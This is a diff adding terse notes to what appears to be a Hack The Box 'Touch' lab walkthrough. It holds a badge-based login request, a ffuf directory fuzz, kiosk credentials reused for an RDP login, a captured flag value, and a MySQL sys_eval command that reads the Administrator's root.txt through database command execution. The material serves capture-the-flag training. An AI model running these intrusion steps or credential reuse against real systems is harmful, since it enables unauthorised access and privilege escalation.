@@ -51,3 +51,32 @@ curl -X POST http://touch.htb:8443/login/badge \
   -d '{"badge":"KS7X2M"}' -k
 
 https://jhasagar.com.np/touch-htb-writeup.html?i=1
+
++-$ ffuf -u http://10.129.71.63:8443/FUZZ -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -fs 0
+
+KioskUser / K!0sk2026#
+
+ NX-DH-2024-B7042
+
+http://touch.htb:8443/api/status
+	
+device	"Nexion DeviceHub DH-100"
+serial	"NX-DH-2024-B7042"
+firmware	"1.4.2"
+status	"online"
+uptime	3698
+
+xfreerdp /v:touch.htb /u:KioskUser /cert:ignore - this works
+
+xfreerdp  / K!0sk2026# 
+
+![alt text](image.png)
+
+
+xfreerdp /v:touch.htb /u:KioskUser /p:K!0sk2026# /cert:ignore +clipboard
+
+K!0sk2026#
+
+efc0ce27a11189eed23f9adbb34c18ab
+
+C:\MySQL\bin\mysql.exe -u root -p"HTB@irw4ys_DB!2026" -e "SELECT sys_eval('type C:\\Users\\Administrator\\Desktop\\root.txt');"
